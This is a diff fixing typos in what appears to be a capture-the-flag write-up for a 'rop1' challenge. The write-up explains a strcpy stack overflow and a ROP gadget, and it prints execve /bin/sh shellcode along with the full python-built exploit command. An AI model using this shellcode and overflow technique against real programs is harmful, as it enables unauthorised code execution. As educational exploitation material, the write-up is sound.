@@ -25,7 +25,7 @@ int main(int argc, char **argv){
 }
 ```
 
-#S#olution
+#Solution
 What should come to our attention is the use of ```strcpy()``` function. This does not check for the length of the string we put in, so we are able to overwrite the content of the stack.
 As the name of the challenge suggests, we are to implement ROP, and what we need here is so-called ROP-gadget that alters the value of the instruction pointer %eip 
 in order to execute our shellcode.
@@ -60,7 +60,7 @@ Not over yet. The string we pass in must contain the shellcode we want to execut
 ```
 ”\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh”
 ```
-Note that this system is little-endian. So we had to reverse the order of the hex digit: this applies to the address of the ROP-gadget too. 
+Note that this system is little-endian. So we had to reverse the order of the hex digits: this applies to the address of the ROP-gadget too. 
 Finally, we just feed this to the program as follows 
 ```
 ./rop1 $(python -c 'print "\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh"+ "a"*38 + "\x86\x8d\x04\x08" ')
